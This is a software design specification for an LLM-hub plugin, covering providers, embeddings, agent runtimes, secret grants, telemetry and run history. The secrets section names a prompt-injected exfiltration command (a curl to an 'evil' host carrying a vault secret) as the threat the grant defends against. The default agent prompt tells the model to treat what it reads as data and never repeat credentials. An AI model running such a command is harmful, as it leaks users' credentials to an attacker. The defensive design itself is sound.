# §llm — The model hub: providers, embedding, agents

Chapter 0013 of the [swiss specification](../SPEC.md).

One plugin holds every model the toolbox asks, configured once: **providers** (named
endpoints), the **embedding** model, **agents** (who executes a tool-using task) and the
**telemetry** that reports their runs. A consumer names what it needs - memory's semantic tier
follows the embedding block, a sync run names an agent - and never restates an endpoint or a
key. Nothing here runs on its own: the plugin applies a row and serves its routes, and a
consumer asks at the moment it needs a model.

**Crate.** `swiss-llm` owns the row's check, the chat client (genai's adapters over the tree's
one reqwest), the `/embeddings` client, the builtin agent loop and the OTLP exporter; it
depends on `swiss-core` and `swiss-host` only - no axum, no peer crate. The plugin wrapper
(`crates/swiss-plugins/src/llm.rs`) and the routes (`crates/swiss-plugins/src/llm_api.rs`) live in `swiss-plugins`. The
applied row is one shared `LlmState` the composition root hands to each consumer: a consumer
reads it when it asks, and one that caches something derived from it (memory's embedder)
watches its generation, which every apply, start and stop moves. While the plugin is not
serving the state holds no row - a consumer says the llm plugin is not running, never runs on
a stale one (`consumers_see_the_row_only_while_it_serves`).

**Descriptor.** Id and kind `llm`, label `LLM`, version `0.1`, config schema version 1; three
pages, each layout `page` - `llm-providers` (Providers, order 85), `llm-embedding` (Embedding,
86), `llm-agents` (Agents, 87) - after Memory's 80; the default rail seats every served group
up to the cap (§panel.nav), so LLM rides it without a pin; route `/api/llm`;
`restart_on_config_change: false`; no `requires`. The capability probe answers `llm` while the
plugin serves; `memory` declares `requires: ["llm"]`, which is a badge on the Plugins page and
never a refusal - notes, search, the MCP and the CLI work without it (§host.plugins).

## §llm.config — The row

One row, checked whole by `LlmConfig::parse` at validation, create and apply:
`{enabled?, providers?, embedding?, agents?, telemetry?}`; any other key is refused. The blocks
reference each other by **name** only - the embedding block and every provider-asking agent
name a provider - and every reference is checked here, so a row naming a provider it lacks is
refused at the PUT, never discovered by the first run. Names are 1..32 chars of `[a-z0-9-]`
starting with a letter or digit; a provider's may take capitals too (`[A-Za-z0-9-]`: `GLM`,
`DeepSeek`, `OpenRouter`), and two provider names apart only in case (`glm` and `GLM`) are
refused, since a model menu could not tell them apart. Every error names its place (`agents.distiller.provider …`)
and none quotes a credential. On top of the crate's check the composition runs memory's
secrets check (`swiss_memory::secrets::scan`) over every agent env value and telemetry header
value, so a pasted token under an innocent name is refused too, unquoted. Every block applies
in place: the state swaps the row and bumps its generation, no restart. The row travels
through the host's `GET|PUT /api/plugins/llm/config` (a GET for the revision, the CAS PUT);
`/api/llm` never writes it (`a_row_parses_into_its_four_blocks`,
`the_row_refuses_what_it_does_not_define_and_dangling_names`,
`names_urls_and_details_are_checked_once_for_every_block`,
`a_pasted_credential_is_refused_under_any_name`,
`a_row_applies_in_place_and_stop_takes_it_off_the_air`).

## §llm.providers — Named endpoints

`providers: {name: entry}`, at most 16. **Entry**: `style` (required) - `openai` (`POST
{baseUrl}/chat/completions`: OpenAI, Ollama, vLLM, DeepSeek, GLM's `/api/paas/v4`; the base
URL carries its own version segment) or `anthropic` (`POST {baseUrl}/v1/messages`: Anthropic,
GLM's `/api/anthropic`); `baseUrl` (required; http or https with a host and no credentials,
query or fragment, a trailing slash dropped); `apiKey` - a `${secret://name}` or `${ENV_VAR}`
reference only, refused as a literal without being echoed, absent for a keyless local server;
`models` - the models the endpoint serves, `[{id, kind, name, contextWindow, maxOutput, image,
thinking}]` (≤ 64; `id` ≤ 200 printable chars, each once; `kind` `chat`, the default, or
`embedding` - an anthropic-style entry lists chat models only, its wire has no embeddings; the
rest what the vendor states about the model, each optional: `name` (≤ 80 printable chars) what a
menu shows, the id when absent, and a chat model's alone - an embedding model carrying one is
refused - `contextWindow` (1024..100 000 000 tokens), `maxOutput` (256..100 000 000, never past
its `contextWindow`), `image` (it reads images beside text; false) and `thinking` (it takes a
thinking effort; true). A chat on a listed model asks at most its `maxOutput` - an agent's
`maxTokens` past it is cut to it, never refused - and one listed `thinking: false` is sent no
effort (**Effort** below); `a_model_states_its_window_output_image_and_thinking`); `proxy` (http, https or socks5, this provider only;
credentials in it only as references). Literal userinfo is checked independently of references
in other URL components: a path/query reference or a referenced username never excuses a literal
password. Invalid references are refused without echoing their contents.

**Models are picked, never typed.** Every consumer names a provider and one of its listed models
of the kind it needs - an agent a chat model, the embedding block an embedding model - or none,
and then gets the first listed model of that kind. A model the entry does not list, or lists
under the other kind, is refused with the ids it does list; a consumer that names none of a
provider listing no model of its kind is refused too. So the row never points at a model the
provider was not said to serve, and a model id changes in one place. **Discovery** asks a saved
provider for its own listing - `GET {endpoint}models` (`/v1/models` on the Anthropic wire, with
its version header), the answer's `data[].id`, at most 500, 20 s - and guesses each id's kind
from its name (`embed`, `bge*`, `minilm`, `gte-*`, `e5-*` on an openai-style entry): a guess the
panel prefills and the operator confirms, never written by itself.

The key resolves when a client is built and lives only in that value: never stored resolved,
never logged, and a reference that resolves to nothing is an error naming the reference. An
anthropic-style entry sends the key on both `x-api-key` (what Anthropic reads) and
`Authorization: Bearer` (the only header GLM's Anthropic endpoint accepts). Both wires are
swiss's own - the request body and the reading of the streamed answer (OpenAI's chunks,
Anthropic's named SSE events); genai's types carry the conversation (messages, tool calls,
usage). genai's Anthropic adapter speaks thinking only to the Claude models it lists, so an
Anthropic-compatible endpoint (GLM, Kimi, DeepSeek) could never be told an effort through it. A provider's error is scrubbed of the resolved key and clipped
before it is stored or shown. Token counts follow Claude's semantics wherever they are shown
or reported: input tokens exclude the cache, cache reads and cache creation counted apart
(`providers_parse_named_entries`, `providers_refuse_the_shape_mistakes`,
`a_consumer_picks_a_listed_model_of_its_kind`, `discover_reads_the_listing_and_guesses_the_kind`,
`ask_speaks_the_openai_wire`, `ask_speaks_the_anthropic_wire_with_both_key_headers`,
`a_refusal_names_the_status_and_never_the_key`, `tokens_take_the_cache_back_out_of_the_prompt`).

**Effort.** An agent's `effort` (§llm.agents) rides each request. The OpenAI wire sends it as
`reasoning_effort`, and the answer's cap as `max_completion_tokens` to OpenAI's reasoning
models (`o1`, `o3`, `o4` and every `gpt-<N>` from 5 on, which refuse `max_tokens`) and as
`max_tokens` to every other model. The Anthropic wire sends `thinking: {type: "adaptive"}` with
`output_config: {effort}` - what GLM, Kimi and DeepSeek behind an Anthropic-compatible
endpoint and a Claude from the 4.6 generation read (GLM ignores `budget_tokens`) - and to an older Claude
`thinking: {type: "enabled", budget_tokens}` (low 1024, medium 8000, high and max 24 000, kept
under `max_tokens`; a ceiling too small to think in asks without thinking). No effort sends
neither: the model thinks as it does by default (GLM always does). A model its entry lists with
`thinking: false` (Qwen3.8 Flash, MiniMax M3: they refuse an effort) is sent none, whatever the
agent asks (`openai_preflight_normalizes_model_options_without_network`). A round's signed thinking
blocks are kept with the round (a `ThoughtSignature` part) and replayed first in its assistant
turn on the Anthropic wire, so a thinking model's tool turn keeps its signature chain; the
OpenAI wire drops them (`effort_maps_to_adaptive_thinking_except_on_an_older_claude`,
`budget_thinking_is_told_by_the_claude_generation`,
`payload_spells_turns_tools_and_signed_thinking_the_wire_way`,
`stream_reads_thinking_text_and_tool_calls_with_their_signature`,
`signed_thinking_rides_the_log_back_ahead_of_its_calls`).

**Thinking models keep their reasoning in the replay.** DeepSeek's official OpenAI-style
thinking mode, run with tools, requires the `reasoning_content` of every previous assistant
turn to ride back in the conversation — even turns that precede a later user message
(provider-verified). DSH's native signed thinking is likewise replayed across user turns
the target provider and model say it belongs, checked by provenance — what the gating
avoids is replaying a foreign opaque signature from some other provider. v1 gates this on
the exact official DeepSeek host with its currently verified model and tools; an explicit
capability for proxies and local aliases is deferred and unverified, with no UI knob.

## §llm.embedding — The embedding model

`embedding: {provider, model, dimensions?, batch?, timeoutMs?, queryPrefix?, documentPrefix?,
minSimilarity?}` - the one embedding model every consumer shares. Absent, or `provider:
"off"`: no semantic tier anywhere. `provider` names an **openai-style** entry - the wire is
OpenAI's `POST {baseUrl}/embeddings` (a hosted API, a relay, or a local server holding BGE-M3
or a MiniLM); an anthropic-style entry is refused, that wire has no embeddings - and the block
takes its base URL, key reference and proxy from it, so a local Ollama that chats and embeds is
configured once. `model` - one of the entry's embedding models; absent, its first (§llm.providers);
`dimensions` (1..8192, sent as the request's
`dimensions`); `batch` (1..256 texts per request, 16); `timeoutMs` (1000..120 000, 30 000);
`queryPrefix` / `documentPrefix` (≤ 200 chars, kept as typed, for E5-style models);
`minSimilarity` (0..1) - the least cosine that counts as close in meaning, query-time only;
absent, the consumer's default (memory's is 0.3, §memory.embedding).

`remote` says whether text leaves the machine: the endpoint's host is not loopback
(`localhost`, `127.*`, `[::1]`). The **fingerprint** a consumer keys its stored vectors by is
`openai:<model>:<dims>:ep-HASH`, plus `:doc-HASH` when a document prefix is set - `dims` the
requested width or `native`, each HASH 8 hex of a SHA-256 (of the base URL as parsed - scheme
and host lowercased, the default port and a trailing slash dropped - and of the prefix). The
provider's *name*, the proxy and the query prefix change no stored vector and are not part of
it: renaming a provider re-embeds nothing, moving its endpoint re-embeds once (ADR-032). The
client answers vectors in the provider's index order and scrubs the key from every error; what
a vector means - normalization, the width check, the floor - is the consumer's
(`a_block_resolves_its_provider_and_fills_defaults`, `a_block_refuses_what_it_cannot_embed_with`,
`the_fingerprint_names_the_endpoint_not_the_provider_name`, `answers_are_read_in_index_order`,
`the_client_posts_to_the_providers_embeddings_path`).

## §llm.agents — Named agents

`agents: {name: agent}`, at most 16. An agent is **who executes a tool-using task**: a runtime
and what it needs, its limits, and whether it reports. A consumer names an agent (memory's
`sync.agent`), never an endpoint; the name is the contract, and a consumer keeps working when
the agent behind it changes runtime. `runtime` defaults to `builtin`:

| Runtime | What runs | Its own keys |
|---|---|---|
| `builtin` | swiss's own tool loop over a provider: the consumer hands in its tools; the loop asks, runs the tools the model calls, feeds their answers back, until an answer without a tool call or the turn cap | `provider`, `model`, `maxTurns` (1..64, 24), `maxTokens`, `maxContextKiB`, `effort`, `tools`, `secrets` |
| `chat` | one request, one answer, no tools - for a model too small to call tools | `provider`, `model`, `maxTokens`, `maxContextKiB`, `effort` |
| `claude` | a spawned Claude Code; the consumer composes its flags, the agent carries the binary, the model and the env | `command`, `model`, `env`, `tools` |
| `pi` | a spawned pi-coding-agent, its providers from its own `~/.pi/agent/models.json` | `command`, `model` (required: a `provider/model` id), `env`, `tools` |
| `db` | the Data page's agent and nothing else's (§data.agent): swiss's tool loop over a provider under that page's prompt and its tools - the connection kind's own and the connection's memory - both fixed | `provider`, `model`, `maxTurns` (1..64, 24), `maxTokens`, `maxContextKiB`, `effort` |

A `db` agent is the one no consumer names: a memory task naming it is refused (`x is a DB
agent: it serves the Data page alone`), the fallback to the newest agent skips it, and the
Agents Test refuses it; the Data page, in turn, works with a db agent only and never borrows
a task agent (`a_db_agent_works_the_data_page_alone_under_its_own_prompt_and_tools`).

Every agent takes `timeoutMs` (60 000..7 200 000, 1 800 000 - the whole task's cap),
`report` (default true, false for pi; `report: true` on a pi agent is refused - pi has no
telemetry hook), `systemPrompt` and `concurrency` (1..16; 4 for `builtin`, `chat` and `db`, 1 for `claude`
and `pi`) - how many of the agent's tasks one consumer runs at once: memory's map areas and
init slices (§memory.map, §memory.init). A key another runtime reads is refused by name (`agents.x.env does not apply
to the builtin runtime`), so a runtime switch that leaves a stale field behind is said, never
silently ignored. `provider` (builtin, chat and db, required) names an entry; `model` is one of that
entry's chat models, absent its first, and an entry listing none refuses the agent
(§llm.providers). `maxTokens` (256..131 072, 131 072: the most GLM takes) caps
each answer. `maxContextKiB` (builtin, chat and db: 64..8192, 1024) caps each request: the
system prompt, the tools, the replayed dialogue and the new prompt as serialized for the
wire; a loop round over it refuses before it flies, naming the budget, and a conversation
whose replayed prior context has reached it refuses its next send (`over-budget`). It weighs
one request, never the run's record, whose calls each re-send the dialogue before them. Never a silent clip. `effort` (builtin, chat and db: `low`, `medium`, `high`, `max`) - how hard the model
thinks before it answers, on the wire as §llm.providers says; absent, the model's own default
(a model id's own suffix, `glm-5.3-flash-low`, still counts - except `-max`, which is a
vendor's tier in ids like `qwen3.8-max`, `qwen-max` and `gpt-5.1-codex-max` and stays in the id;
Max is this field's to ask). A consumer may ask one task at an
effort of its own over the agent's (`chat_at`) - a lead handing a piece of its work to a
low-effort worker (memory's `delegate`, §memory.init The lead). `command` (claude and pi; default `claude` / `pi`): a bare name looked up on
PATH (PATHEXT on Windows), then in `~/.local/bin`, or an absolute path; a relative path is
refused.
`env` (≤ 32 names `[A-Z_][A-Z0-9_]*`, never `SWISS_*`, values ≤ 2000): what the child gets on
top of the gateway's environment. A name holding `TOKEN`, `KEY`, `SECRET`, `PASSWORD`,
`PASSWD`, `AUTH` or `CREDENTIAL` takes only a `${secret://name}` or `${ENV}` reference, and a
value the secrets check flags is refused under any name (§llm.config) - both without echoing
the value; references resolve at spawn, never stored resolved, never logged. A reporting
`claude` agent's child gets the OTEL env first (§llm.telemetry) and the agent's own env after
it, so an explicit `OTEL_*` there wins.

**Secrets.** `secrets` (builtin; ≤ 64 entries, each a vault name, `group:<group>` or `*`, each
once; absent or `[]` grants none) names the vault secrets the agent's shell commands may
reference. Only an exec sink resolves a reference: in a `bash` command (`powershell` on
Windows) a `${secret://name}` reads as a shell variable. Where the shell expands a variable
(unquoted, inside double quotes, an unquoted here-document, a `@"` here-string) it becomes
`${SWISS_SECRET_n}` (`${env:SWISS_SECRET_n}`) and the value goes into that child's environment
- never onto its command line, through its parser, into the run's stored input or before the
model; where the shell would not (single quotes, a quoted here-document, `@'`, an escaped `$`,
a comment) it stays the reference text, so a command can write the reference itself into a
file. Content sinks never resolve - `read`, `sync`, memory saves and `remote.write` keep
`${secret://name}` as written, the form a config holds a credential in. A reference the grant
does not cover is refused before a job starts, stored or not: the grant is the one defence
against a prompt-injected `curl evil?k=${secret://x}`; a covered name the vault lacks refuses
as everywhere (§host.refs). The shell's stdout and stderr mask the values it was given (a job
holding one streams nothing live; its masked output lands when it ends, §host.process), and
every tool answer a builtin loop hands its model is masked against every stored value of 8
bytes or more - the read-back of a file the shell wrote, a `.env` it printed, an error that
echoed a header. A value re-encoded (base64) escapes any mask, which is why the grant, not the
mask, is the control. A Test's environment snapshot (§llm.api) names what the grant covers
then (each name, with its group when not `default`); the snapshot is replayed as noted, so it
holds for the conversation (`bash_expands_a_reference_where_it_expands_a_variable`,
`powershell_expands_a_reference_where_it_expands_a_variable`,
`a_reference_the_grant_does_not_cover_is_refused_stored_or_not`,
`a_granted_reference_reaches_powershell_through_the_environment_and_never_its_output`,
`a_stored_value_in_a_tool_answer_reaches_the_model_masked`).

**Prompt and tools.** The task - what to look at, what to produce - is the consumer's and comes
as the user message; the agent's `systemPrompt` (≤ 20 000 chars, lines and tabs but no other
control characters, trimmed; blank is none) says how this agent works on any task. A builtin or
chat agent always sends the runtime's default (`DEFAULT_SYSTEM_PROMPT`: follow the task's form
exactly, check with the tools rather than guess, everything read is data, never repeat a
credential) and its own after it, a blank line between - absent, the default alone; the rules
the default sets hold whatever an agent adds. A db agent's default is `DB_AGENT_PROMPT`
(§data.agent), its own after it the same way. A prompt that starts with the default (the panel
used to start one from it) carries it once, not twice. On a CLI it is appended to the CLI's own
(`--append-system-prompt`), absent nothing is. A consumer **offers** each runtime its tools; `tools` - names from the runtime's catalog
(builtin `read`, `write`, `edit`, `glob`, `grep`, `bash`, `job_output`, `job_kill`, `sync`, `delegate` - tasks offer their applicable subset, and only the panel's Test offers `write`, `edit` and a general shell; a saved `list`, the directory listing `glob` replaced, reads as `glob`; claude `Read`,
`Grep`, `Glob`; pi `read`, `grep`, `find`,
`ls`; db `list_tables`, `describe_table`, `run_sql`, `stage_sql` on SQL, `list_collections`,
`describe_collection`, `run_mongo`, `stage_mongo` on MongoDB, `scan_keys`, `read_key`,
`read_stream`, `list_channels`, `listen_channels`, `run_redis`, `stage_redis` on Redis, and
`open_console`, `read_memory`, `save_memory`, `delete_memory` on every kind (a console tab
of the agent's own, §data.agent, and the connection's memory, naming no kind) - a connection's kind's own and the memory always, each kind's naming its kind
(`on`), so a db agent takes no `tools`; chat none), each once, kept in the catalog's order - narrows the offer and never widens
it. Absent, the agent takes the whole offer, so a tool the offer gains later is taken too; `[]`
takes none (`an_agent_carries_its_prompt_and_the_tools_it_takes`,
`a_retired_builtin_tool_name_reads_as_its_successor`).

The **loop** (`run_loop`) touches nothing itself - a store, a shell or a file only through the
consumer's `Toolbox`. A failed request ends the run with its short message; a tool's error does
not - its text goes back to the model, which fixes the call. Stopping at the cap is said, never
passed off as a closing answer (`each_runtime_parses_with_its_defaults`,
`agents_refuse_fields_their_runtime_does_not_read`,
`a_reporting_claude_agent_gets_the_otel_env_before_its_own`,
`effort_and_concurrency_parse_and_reach_the_request`).

**Compaction** (`run_compaction`, `conversation::fold`) condenses a conversation into a
checkpoint it carries on from - the Data page's today (§data.agent Compact). The open
conversation must pass the continuation guards, its budget aside (a dialogue past
`maxContextKiB` is what compaction is for), and hold an answered turn (`empty` otherwise).
It closes, and a new conversation opens in the same scope, its source `compact:<id>`, its
system the one the old opened with. The new run's opening round is the compaction: one ask
replaying the old canonical prior context with the consumer's instruction after it. The
conversation's tools are declared, since a wire that saw tool calls in the history refuses a
request without them, and none runs: a call answers as an error and the one round's cap ends
it without a checkpoint. The round files the instruction as its `compact` turn and seals
`COMPACT_FRAMING` as its user turn, so a continuation replays the framing and the checkpoint,
never the condensed turns. The ask may pass the byte budget; the provider's own window bounds
it. A compaction that leaves no checkpoint - an error, a cancel, a cut at `maxTokens`, an
empty answer - files the new run failed (`fail_conversation`: never to continue or reopen)
and reopens the old one (`undo_fold`)
(`a_fold_opens_the_next_conversation_and_its_undo_reopens_the_old_one`).

## §llm.telemetry — Reporting agent runs

`telemetry: {enabled?, protocol?, endpoint, headers?, serviceName?, logPrompts?}` - an OTLP logs
exporter that reports every agent run in **Claude Code's own event vocabulary**, so a collector
built for Claude Code (cc-otel, a dashboard over its tables) reads swiss's agents with no new
mapping. `enabled` (true; false keeps the settings and sends nothing); `protocol` - `grpc`
(default), `http/protobuf` or `http/json`; `endpoint` (required) - the collector's base URL,
never a signal path (a typed `/v1/logs` is dropped; for `grpc` any path is refused, gRPC routes
on the service path alone); `headers` (≤ 16, names of `[A-Za-z0-9-_]` ≤ 64, values ≤ 2000;
`content-type`, `content-length`, `te`, `host` and `grpc-*` are the exporter's own and refused;
a credential-named header must hold a reference - `Bearer ${secret://otel}` is the usual
shape); `serviceName` (≤ 64, default `swiss`); `logPrompts` (false: a `user_prompt` record
carries the prompt's length only; true: its text too, cut at 16 000 chars - Claude Code's
`OTEL_LOG_USER_PROMPTS`).

**Records.** One OTLP log record per event, its body `claude_code.<event>` as Claude Code
writes it:

| Event | Attributes beyond the common ones |
|---|---|
| `user_prompt` | `prompt_length`, `prompt` (only with `logPrompts`) |
| `api_request` | `model`, `input_tokens`, `output_tokens`, `cache_read_tokens`, `cache_creation_tokens`, `duration_ms`, `ttft_ms`, `request_id` |
| `api_error` | `model`, `error`, `status_code`, `duration_ms`, `attempt`, and cc-otel's `error.*` |
| `tool_decision` | `tool_name`, `decision`, `source` |
| `tool_result` | `tool_name`, `success`, `duration_ms`, `tool_result_size_bytes`, `decision_type`, `decision_source` |

Every record carries `event.name`, `event.timestamp`, `event.sequence`, `session.id` (one per
run), `prompt.id`, `terminal.type` = `swiss`, and swiss's own `swiss.agent` and
`swiss.consumer` (`memory.sync`, `llm.test`). The resource is `service.name`,
`service.version`, `os.type` and `host.arch`; the scope `swiss.llm`. No cost is reported: swiss
holds no price list, and a reader that has one computes it.

`ttft_ms` is the time to first token: from the request's start to the model's first output on
the stream, whether thinking, text or a tool call. The stream's opening frames (`message_start`,
`ping`, a role-only chunk) do not count. It is taken as that output arrives, before a surface
paints it, so a slow reader never adds to it. A reply with no output at all carries no
`ttft_ms`, and a reader shows it as unknown, never as 0. cc-otel files it as the request's TTFT,
the column Claude Code's own requests fill.

**Who reports.** A `builtin` or `chat` agent with `report` on is reported by swiss itself. A
`claude` agent is not reported from here at all: its child gets `CLAUDE_CODE_ENABLE_TELEMETRY=1`,
`OTEL_LOGS_EXPORTER` and `OTEL_METRICS_EXPORTER` = `otlp`, the block's protocol, endpoint and
`OTEL_LOG_USER_PROMPTS`, the headers resolved into `OTEL_EXPORTER_OTLP_HEADERS` (the child's env
only), and `OTEL_RESOURCE_ATTRIBUTES=swiss.agent=<name>` - and reports itself exactly as Claude
Code does under any host. A `pi` agent never reports.

**The exporter.** A run never waits on the collector: a record is pushed onto a bounded queue
(4096; past it the oldest go first, counted as dropped) and one task on the plugin's scope
exports up to 512 per request every 5 s, or as soon as a batch fills. The wire: `grpc` - `POST
{endpoint}/opentelemetry.proto.collector.logs.v1.LogsService/Export` over HTTP/2 (prior
knowledge on http, ALPN on https), the verdict in `grpc-status`; `http/protobuf` and
`http/json` - `POST {endpoint}/v1/logs`, any 2xx accepted. A retryable failure (HTTP
429/502/503/504; gRPC CANCELLED, DEADLINE_EXCEEDED, RESOURCE_EXHAUSTED, ABORTED, UNAVAILABLE; any
network failure) keeps the batch and backs off from 1 s, doubling to a minute; any other failure
drops it - it would fail again unchanged. `api_request` records carry a unique `request_id`, so
a batch the collector stored before its answer was lost is deduplicated on the retry. A partial
success counts its records as rejected. A stop flushes once more, within 2 s. No error quotes a
resolved header value. The counters - sent, queued, dropped, rejected, the last export and the
last error - are on `GET /api/llm/status` (`the_block_parses_with_its_defaults`,
`the_block_refuses_what_would_not_export`, `claude_env_points_the_child_at_the_same_collector`,
`a_session_files_claude_code_shaped_records`, `the_queue_is_bounded_and_off_drops_it`,
`a_retryable_failure_keeps_the_batch_and_a_final_one_drops_it`, `the_task_flushes_on_cancel`,
`grpc_frames_the_request_and_reads_the_trailer`,
`the_http_wires_post_to_v1_logs_with_the_headers`).

## §llm.history — The call and conversation record

The llm module's own database, `logs/llm.db`, on the `§host.history` machinery (ADR-033's
owner pattern, ADR-035's precedent for a later enrollee). **Every provider round trip is
recorded**: each chat request and reply — the system prompt and the user prompt (the run's
originating prompt, with the turn it served), the texts and tool calls that came back, the
tokens in/out/cache, the HTTP status, the duration,
the provider's request id — and each embedding call: its duration and outcome, and — so the
round trip is reproducible from the record itself — its full input texts and the vectors the
endpoint answered, each component rounded to six decimals, from every consumer alike: a panel
Test, memory's sync and map fill, the embedder, the builtin loop's every turn. Those texts and
vectors are data, not metadata, and sealing is confidentiality, not anonymization: an
embedding can leak the text it embeds, so the record stays admin-only behind the session,
bounded by the share's quota, swept at 180 days with the rest of the record, and never
exported anywhere. The seal covers the FULL bodies — the 64 KiB chunks of `§host.history` —
not the whole row: each call and turn keeps a ~2 KiB plaintext preview inline in the index
by design, so the head of a text is readable in the raw database file and only its tail
seals. That split is the boundary, not a sealing failure — and it is proven live: a >2.6 KiB
answer reads in full through the unseal path while its tail is absent from the raw
database, with the WAL sidecar checked as well as the main file (a fresh write lives in
the WAL first), and none of the three raw files — database, WAL, shm — carries the
sealed text (the ~2 KiB preview is the designed plaintext exception).
**Every agent conversation is recorded** as a run — the whole dialogue turn by turn (system,
user, assistant, tool, final, error), multi-turn loops and single asks alike. A panel Test is one of them: the Test dialogue is a
true persisted conversation the operator carries over several prompts (the design target is
three or more user turns on the one run), each prompt filed as that run's next user turn
while the turns already filed stay exactly as they were — incremental filing, a run that
grows by turns and never rewrites them.

What is never recorded: the API key (it lives in headers, and headers are not kept); and a
spawned claude or pi run - swiss makes no HTTP round trip of its own to the child (it spawns
and reads the exit), so v1 files NO row for it here, call or run: the child reports itself
through telemetry (`§llm.telemetry`), and memory's own sync store holds the run's outcome.

**Runs have kinds; calls carry their run.** The schema grows additively: v2 added a nullable
`call.run_id` (backfilled from the run whose window contains each call); v3 adds the run's
`kind` discriminator — `conversation` for a carried dialogue, the legacy kind otherwise —
NULL on rows v3 never wrote, which read as the legacy kind. A conversation's calls take
their `run_id` at record time. An in-memory MAX-only id counter was considered and REJECTED
— an orphan id after a restart can be reused, and two processes sharing one home collide.
Reservation is the database's: a recorder reserves against the real rows (SQLite), a
oneshot's placeholder is a `kind` NULL row — hidden from the public lists — made real by an
UPDATE at its finish, and a conversation is `kind` 1, visible and open. The legacy window
linkage is migration-only (the v2 backfill); a scoped call carries its `run_id` explicitly.
Reservation fails closed — a submit, receiver or SQL error refuses the write; it never
falls back to window linkage. Resuming a run (the stream's `runId`) never duplicates a
row or a body: the next turn files against the run that already exists. The continuation
lane refuses before any provider request, every refusal a 409 with its machine code. A
request with NO run id is the VALID new-conversation path, allowed exactly when the
agent has no continuable open run — `open-run-exists` is its refusal otherwise, decided
by the continuable query, never the open listing (rows the migration marked ambiguous
stay visible for audit but never block a fresh conversation). A request that NAMES a run
gets `gone` when no open conversation of this agent matches it, `closed` when it is
closed. `context-changed` — the provider or model in force, or the agent's system
prompt, changed since the run opened (read from the run's system turn alone, never its
whole dialogue; a system body that will not read counts as changed). The reader can move
an open conversation to another provider and model first (`retarget_conversation`, the
Data agent's menu, §data.agent): the row names them, the endpoint and header fingerprint
are checked against the run's latest call to them (none yet: nothing to contradict), and
the replay drops the signed thinking another model wrote. `unresolved-tail` —
activity the run cannot prove canonically (an unresolved activity mark, a pre-protocol or
pruned body, the migration's legacy mark): an unfinished cancellation that observed no
prefix, or a mid-tool unresolved activity, is the refusing shape, and no fresh unscoped
send silently forks a pending run;
and `over-budget` — the continuation budget: 400 turns, 512 model calls, or a replayed
prior context at the agent's `maxContextKiB`, a rejection and never a silent clip. What a continuation replays is CANONICAL
sealed structure only — the last call's replay log plus its response, ids and arguments
intact — and an observed, non-empty cancelled prefix together with its user request is a
terminal settled round: retained canonically, continuable. Recovery from a refusal is
the operator's explicit close of the run, or the panel's New, which closes the old run
before opening the new.
**One open conversation per agent AND scope.** The scope is the run's `task` and `subject`
in force (the task-local context, next paragraph): the conditional INSERT, the continuable lookup and a
continuation's check all compare them (NULL matching NULL), so an agent holds one open
conversation for its Test (no task) and one for each Data connection (`data.agent` and the
connection's name, §data.agent) side by side, and a run named from another scope reads as
`gone` - another connection's dialogue is never continued, nor a Test's from Data.
**A closed conversation reopens; a compacted one hands on.** `reopen_run` puts a neutrally
closed conversation of the agent in the scope in force back open - its row, turns and calls
as they stand - only while the scope holds no other open one (checked in the same statement)
and only when no round is left unresolved; a failed run never reopens (`fail_conversation`
closes one so: a compaction whose checkpoint did not land). `conversation::reopen` closes
the open one first, and puts both back when the reopened run fails the continuation guards
(`a_closed_conversation_reopens_in_its_scope_and_a_refusal_puts_both_back`). A compaction's
run carries `source` `compact:<the run it condensed>` and files its instruction as a
`compact` turn (§llm.agents Compaction): History reads it as *compacted from run N*, the
checkpoint folded.
**A run says what it was for and who started it.** v7 adds four nullable run columns:
`task` (a short key naming the consumer's job — `memory.recheck`, `memory.task`, ...),
`subject` (what that job is about: the domain, the file, the question's first line),
`source` (the job that triggered it, `memory:<sync run id>`), and `parent` (the run whose
tool call started it). The context is task-local — a consumer opens it around the work it
names, and a tool call's run inherits the source and names its parent — and rows written
before v7 say nothing: NULL, never a guess from the prompt text. A run a tool call started
lists under its parent, never beside it on the unfiltered page (an agent's own page lists
them all), and a run's dialogue read carries its parent's row and every run it started.
Its calls come as digests, not bodies: the round, the answer, the stop reason, the tool calls,
the time to first token (`ttftMs`, kept in the call's body when the stream said),
and only the first 400 characters of the prompt and of the preview - a loop's every round
repeats the ask's prompt, the whole of which is the run's user turn and the wire the call's
body, so a long loop's trace carries that prompt once, not once a round.
The public run rows carry what a reader tells runs apart by without opening them: the head
of the first user turn, the chat round trips and their tokens summed, the runs it started,
and its tool calls counted by tool — the panel's history page reads as a trace on those.
**Live: a run in flight says where it is.** A run's turns file only at its finish, so while
it works the record holds its calls alone. Beside the store sits an in-memory registry of the
runs in flight, keyed by the reserved id. For each run it holds:
- when the run started;
- the turns it has noted so far, as the recorder's own list (no copy);
- the round it is on;
- what it waits on now: the model, with the characters this round's stream has carried, or a named tool; and since when.

Nothing in the registry is filed. The run row and its turns still land whole at the finish,
and a restart forgets every entry: a row that a stopped gateway stranded is not live.

A run enters the registry at these points:
- A one-shot run enters when its placeholder is reserved. A memory sync's builtin ask
  reserves before it notes its prompt, so the run is visible from its first request.
- A resumed conversation enters when it resumes.

It leaves at its finish, or when its recorder drops without one.

How live runs read:
- The unfiltered first page lists the live runs not yet filed above the filed rows.
- Every live row carries `live`: `{elapsedMs, round, step: "model"|"tool", tool, stepMs, streamed}`. Its noted turns are merged into its tool counts and head.
- A live run's dialogue read carries its noted turns after the filed ones.
- A live row a memory run asked (`source` `memory:<id>`) carries *Stop*: it cancels that memory
  run by its id alone (§memory.sync Cancel) - every question it has in flight, a review's
  side-by-side batches all at once - and reads *stopping…* until the rows go.
- `?source=<source>` lists the runs one job started, newest first, at most 200. It reads on
  `run (source)`, an index schema v8 adds. The memory-sync sheet reads a sync run's agent
  runs this way (`§memory.sync`).

The panel's run sheet is a conversation (§panel.ui), following DSH's user-right, assistant-left
reading order. Long user context has a short preview and one outer disclosure before its
outline; it never spills dozens of section headings into the dialogue. Completed work folds
under one process summary above the answer; live work opens initially. The process keeps
the flow's per-round and per-tool disclosures. The closing answer is shown once. Its head is three fact lines: the state, what the
run does now, its span and its start; the agent, runtime, provider and model and the tokens;
how it ran, the runs it started and who started it. Each round is one line - a round that
reasoned reads as *Think* under the brain glyph with its thinking's first line, as dsh shows it,
else its number and what it did - with the model's words as prose under it; opened, it shows
the model, tokens and stop reason, the thinking dimmed, and the way to its round trip. Each tool
call is one line - the tool, its argument (the call's own `description`, as prose, when it gives
one, as a shell call does), its span - and opens to its arguments and result on one code surface;
the Agents Test reads its tool calls the same way.

The sheet re-reads a live run every 3 s until the run files, and keeps the steps
and folds the reader opened. The step in flight shows as the flow's last, shimmering step:
the tool still running, or the model awaited. A failed re-read keeps what is painted and
tries again.
